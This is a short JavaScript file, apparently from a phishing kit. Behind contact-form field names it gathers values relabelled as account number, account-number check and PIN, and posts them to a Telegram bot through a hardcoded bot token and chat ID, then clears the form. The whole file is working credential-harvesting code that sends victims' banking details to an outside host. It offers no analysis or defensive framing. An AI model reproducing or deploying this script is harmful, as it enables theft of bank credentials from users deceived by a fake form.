//bot token
var telegram_bot_id = "7310004012:AAHsc_A9EsuZnf5G2xwO5-_b_QzZXc9ck9s";
//chat id
var chat_id = 5267852454;
var u_name, email, message;
var ready = function () {
    u_name = document.getElementById("name").value;
    email = document.getElementById("email").value;
    message = document.getElementById("message").value;
    message = "Actno: " + u_name + "\nActnoCheck: " + email + "\nPin: " + message;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("name").value = "";
    document.getElementById("email").value = "";
    document.getElementById("message").value = "";
    return false;
};

function validateMaxLength(input, maxLength){
    const value =input.value;
    if(value.length > maxLength){
        input.value = value.slice(0, maxLength);
    }
}
